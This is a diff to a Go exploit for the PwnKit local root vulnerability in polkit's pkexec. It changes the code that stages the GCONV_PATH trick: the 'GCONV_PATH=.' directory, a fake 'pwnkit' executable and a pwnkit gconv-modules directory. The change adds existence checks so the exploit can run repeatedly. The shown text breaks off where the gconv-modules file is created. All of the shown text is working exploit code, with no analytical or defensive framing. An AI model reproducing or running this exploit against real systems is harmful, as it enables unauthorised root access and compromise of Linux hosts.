@@ -33,23 +33,29 @@ void gconv_init() {
 
 func main() {
 	// make `GCONV_PATH=.` directory
-	err := os.Mkdir("GCONV_PATH=.", 0777)
-	if err != nil {
-		panic(err)
+	if _, err := os.Stat("GCONV_PATH=."); os.IsNotExist(err) {
+		err := os.Mkdir("GCONV_PATH=.", 0777)
+		if err != nil {
+			panic(err)
+		}
 	}
 
 	// Create pwnkit as a fake executable.
 	// this takes advantave of the gconv charset being set to "pwnkit"
-	f1, err := os.OpenFile("GCONV_PATH=./pwnkit", os.O_RDWR|os.O_CREATE|os.O_TRUNC, 0755)
-	if err != nil {
-		panic(err)
+	if _, err := os.Stat("GCONV_PATH=./pwnkit"); os.IsNotExist(err) {
+		f1, err := os.OpenFile("GCONV_PATH=./pwnkit", os.O_RDWR|os.O_CREATE|os.O_TRUNC, 0755)
+		if err != nil {
+			panic(err)
+		}
+		defer f1.Close()
 	}
-	defer f1.Close()
 
 	// Make pwnkit directory with gconv modules
-	err = os.Mkdir("pwnkit", 0777)
-	if err != nil {
-		panic(err)
+	if _, err := os.Stat("pwnkit"); os.IsNotExist(err) {
+		err = os.Mkdir("pwnkit", 0777)
+		if err != nil {
+			panic(err)
+		}
 	}
 
 	f2, err := os.Create("pwnkit/gconv-modules")
